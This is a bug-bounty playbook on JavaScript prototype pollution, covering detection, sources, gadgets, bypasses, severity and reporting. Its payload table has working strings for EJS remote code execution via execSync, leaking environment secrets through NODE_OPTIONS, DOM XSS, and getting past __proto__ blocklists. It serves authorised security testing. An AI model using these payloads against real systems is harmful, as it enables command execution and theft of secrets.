# Prototype Pollution — Bug Bounty Playbook

> Source: PortSwigger Web Security Academy (portswigger.net/web-security/prototype-pollution), compressed extract. JS vuln: attacker adds arbitrary props to global prototypes (usually `Object.prototype`), inherited by all objects → chain to DOM XSS (client-side) or RCE (server-side). Exploit needs: **source** (pollution entry) + **gadget** (unsafe use of inherited prop) + **sink** (execution). Own props always shadow polluted ones; `Object.create(null)` objects inherit nothing.

## 1. Quick Detection

| Probe | How | Confirmation |
|---|---|---|
| JSON body | POST `{"__proto__":{"canary":"p1"}}` to merge/parse endpoints | Prop reflected in later responses or app behavior shifts |
| URL params | `?__proto__[canary]=p1` (qs lib) / brace-expansion / nested `?a[b][c]=x` | Same as above |
| Server reflection | Inject unique prop; look for it echoed in subsequent objects | Direct proof of pollution |
| Server blind oracles (no reflection) | **Status**: `{"__proto__":{"status":555}}` → odd status code. **JSON spaces**: `{"__proto__":{"json spaces":20}}` → pretty-printed JSON. **Charset**: `{"__proto__":{"encoding":"utf-7"}}` → mojibake | Express/res behavior change = polluted |
| Client-side | Append `#__proto__[canary]=p1`; in console check polluted built-ins: `({}).canary` or `for (k in {})` — note `Object.keys({})` shows nothing (proto props aren't own). Burp **DOM Invader** automates canary injection | Canary on fresh object = polluted |
| Client gadget scan | Pollute candidate prop via hash; watch DOM changes, new script/img src, Invader sink hits | Confirms exploitable gadget |

Tools: Burp DOM Invader, Param Miner, ppmap, NodePPScan.

## 2. Attack Vectors

**Sources**
- Recursive/deep-merge of user JSON into existing objects without key sanitization (merge libs, `Object.assign` w/ nesting, lodash).
- Query-string parsers: `qs` (`__proto__[k]=v`), brace expansion, nested-bracket keys.
- `JSON.parse()` quirk: keeps `__proto__`/`constructor.prototype` as **own** keys (unlike object literals) → later merge pollutes.
- Web messages (`postMessage`) feeding merge functions.
- Client-side: URL query or `#fragment` parsed + merged in browser JS.

**Client-side → DOM XSS**
1. Find source (hash/query param that pollutes).
2. Enumerate gadgets: config props used unsafely — `transport_url`, `sourceURL`, `img`/`script` src, `href`, callbacks, template options.
3. Chain: `#__proto__[transport_url]=data:,alert(1);//` → script src = attacker domain or data URL (trailing `//` comments out hardcoded suffix) → XSS.

**Server-side → RCE gadgets (Node/Express)**
- `child_process.fork()/execSync()/spawn`: pollute `env` → `NODE_OPTIONS=--require=/proc/self/environ` (leaks secrets) or attacker JS; pollute `shell`, `execPath`, or inject extra command-line **args**.
- Express **EJS** render: pollute `outputFunctionName` (or `client`, `escapeFunction`) → template code injection → RCE.
- **HBS** and other view engines: pollute render config/handlers props.
- Identify vulnerable request first via blind oracles (§1), then hunt gadgets in app/library code.

**CORS bypass via pollution**: pollute props consumed by naive origin checks or resource-URL builders → exfiltrate sensitive data cross-origin (e.g. pollute the gadget used to build JSONP/fetch URLs).

**Bypassing flawed key sanitization**: blocklists checking the `__proto__` string miss `constructor.prototype` (also an own key after `JSON.parse`), nested notation, or URL/Unicode-encoded variants.

## 3. Payload / Bypass Table

| Goal | Payload |
|---|---|
| Basic pollution (JSON) | `{"__proto__":{"canary":"p1"}}` |
| `__proto__` blocked | `{"constructor":{"prototype":{"canary":"p1"}}}` |
| qs bracket notation | `?__proto__[canary]=p1` |
| URL-encoded | `?__proto__%5Bcanary%5D=p1` or `?%5F%5Fproto%5F%5D[canary]=p1` |
| Nested deep-merge | `{"a":{"__proto__":{"canary":"p1"}}}` |
| Client DOM XSS | `#__proto__[transport_url]=data:,alert(1);//` |
| Status-code oracle | `{"__proto__":{"status":555}}` |
| Charset oracle | `{"__proto__":{"encoding":"utf-7"}}` |
| RCE via EJS | `{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');//"}}` |
| RCE via fork/execSync env | `{"__proto__":{"env":{"NODE_OPTIONS":"--require=/proc/self/environ"}}}` |

## 4. By-Design Filters (SKIP)

- App uses `Object.create(null)`, `Map`, or frozen/sealed `Object.prototype` → no inheritance, skip.
- Key-sanitizing merge libs / patched versions → only test for bypasses (§3), else skip.
- Blocklist on literal `__proto__` only → **not** by-design; try `constructor.prototype` + encodings.

## 5. Severity Guide

| Impact | Severity | Evidence required |
|---|---|---|
| Server-side RCE via gadget chain | Critical | Full chain repro + command output |
| Client XSS via hash/param gadget | High | URL → alert/execution proof in victim browser |
| Auth/CORS/config bypass via pollution | High | Concrete bypassed control |
| Pollution w/ reflected prop, no gadget | Low–Medium | Reflection proof, stated limits |
| Blind server pollution, no gadget | Info | Behavior-oracle proof only |

## 6. Reporting Checklist

- [ ] Source identified: endpoint + param/body + parser (qs/JSON/web message/fragment).
- [ ] Pollution proven (oracle/reflection/fresh-object check) — not assumed.
- [ ] Gadget chain documented end-to-end with repro steps.
- [ ] Impact demonstrated: XSS fired, RCE output, or bypassed control.
- [ ] Any filter/sanitization bypass described.
- [ ] Minimal PoC payload + request/response excerpts attached.
- [ ] Scope check: endpoint in program; no destructive payloads.
- [ ] Remediation advice: block/sanitize `__proto__` + `constructor.prototype` keys, `Object.create(null)`, freeze prototypes, safe merge.

> ⚠️ Blocked/unproven exploit chain = INFORMATIONAL per master KB rule. Never claim HIGH/CRIT from theory alone.
